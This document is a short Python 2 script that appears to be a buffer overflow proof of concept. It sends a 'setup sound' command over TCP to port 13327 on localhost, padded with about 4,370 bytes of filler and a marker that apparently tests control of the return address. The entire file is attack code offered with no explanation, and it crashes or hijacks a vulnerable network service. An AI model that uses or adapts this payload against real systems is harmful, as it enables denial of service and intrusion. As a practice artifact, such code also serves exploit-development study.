#!/usr/bin/python
import socket

host = "127.0.0.1"

crash = "A" * 4368 + "i" * 4 + "C" * (4379-4368-4)

buffer = "\x11(setup sound " + crash + "\x90\x00#"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending buffer..."

sock.connect((host, 13327))
data = sock.recv(1024)
print data
sock.send(buffer)
sock.close()
print "[*] Buffer sent!"
